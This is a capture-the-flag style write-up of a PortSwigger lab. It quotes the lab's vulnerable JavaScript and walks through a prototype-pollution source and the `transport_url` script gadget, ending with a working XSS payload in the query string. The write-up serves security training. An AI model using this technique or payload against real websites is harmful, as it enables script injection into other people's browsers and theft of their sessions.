# DOM XSS via client-side prototype pollution

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution), you'll learn: DOM XSS via client-side prototype pollution! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) via client-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution). To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.

You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.

## Exploitation

### Find a source that you can use to add arbitrary properties to the global `Object.prototype`

**To find a source (Inputs that are under attacker's control), we can do it manually:**

1. Try to inject an arbitrary property via the query string, URL fragment, and any web message data. For example:

```js
vulnerable-website.com/?__proto__[foo]=bar
```

2. In the browser console, inspect the `Object.prototype` to see if we have successfully polluted it with our arbitrary property:
```js
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```
   
3. If the property was not added to the global prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
```js
vulnerable-website.com/?__proto__.foo=bar
```

4. Repeat this process for each potential source.

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-1/images/Pasted%20image%2020230115183605.png)

In here, there is a search box.

Let's try to search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-1/images/Pasted%20image%2020230115185101.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-1/images/Pasted%20image%2020230115185111.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-1/images/Pasted%20image%2020230115185138.png)

When we clicked the "Search" button, it'll send a GET request to `/` with parameter `search`. After that, it'll also send a POST request to `/logger`, with parmater `search`, and the data is in JSON format.

**View source page:**
```html
<script src='resources/js/deparam.js'></script>
<script src='resources/js/searchLogger.js'></script>
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search>
        <button type=submit class=button>Search</button>
    </form>
</section>
```

As you can see, it loaded 2 JavaScript files.

**`deparam.js`:**
```js
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );
            keys = keys.shift().split('[').concat( keys );
            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[key] = i < keys_last
                        ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[key].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[key] = [ obj[key], val ];
                } else {
                    obj[key] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};
```

**There is an `Object.prototype` global prototype:**
```js
if ( keys_last ) {
    for ( ; i <= keys_last; i++ ) {
        key = keys[i] === '' ? cur.length : keys[i];
        cur = cur[key] = i < keys_last
            ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
            : val;
    }

} else {
    if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
        obj[key].push( val );

    } else if ( {}.hasOwnProperty.call(obj, key) ) {
        obj[key] = [ obj[key], val ];
    } else {
        obj[key] = val;
    }
}
```

**`searchLogger.js`:**
```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

In this JavaScript code, it'll send a POST request with our search parameter and result in JSON format.

**Now, we can try to inject an arbitrary property via the query string:**
```js
/?__proto__[foo]=bar
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-1/images/Pasted%20image%2020230115185953.png)

**Then, inspect the `Object.prototype` in the browser console:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-1/images/Pasted%20image%2020230115190035.png)

We successfully polluted the `Object.prototype` global prototype with our arbitrary property!!

Now, we can inject any property via the query string in `/`.

### Identify a gadget property that allows you to execute arbitrary JavaScript

**In the `searchLogger.js` JavaScript file, we can see there is `config` object:**
```js
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
```

In here, we see the `config` object has a property called `transport_url`, which is to set `<script>` element attribute's `src` value. That being said, **that `transport_url` property is to dynamically append JavaScript file to the DOM**. Hence, this is a sink (Unsafe function).

Also, the `transport_url` property is NOT defined for the `config` object.

Armed with above information, **we can try to control the `src` attribute of the `<script>` element via polluting the `transport_url` property in `config` object.**

### Combine these to call `alert()`

**Now, we can send a request that set the `transport_url` property to anything:**
```js
/?__proto__[transport_url]=bar
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-1/images/Pasted%20image%2020230115192441.png)

**Then, use the browser "Elements" tab to confirm we can controll the `src` attribute of the `<script>` element:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-1/images/Pasted%20image%2020230115192615.png)

As you can see, we changed the `<script>` element's `src` attribute to `bar`!

**Finally, we can craft a payload that exploit the DOM-based XSS via polluting the `transport_url` property in `config` object:**
```js
/?__proto__[transport_url]=data:,alert(document.domain);//
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-1/images/Pasted%20image%2020230115193433.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-1/images/Pasted%20image%2020230115193447.png)

# What we've learned:

1. DOM XSS via client-side prototype pollution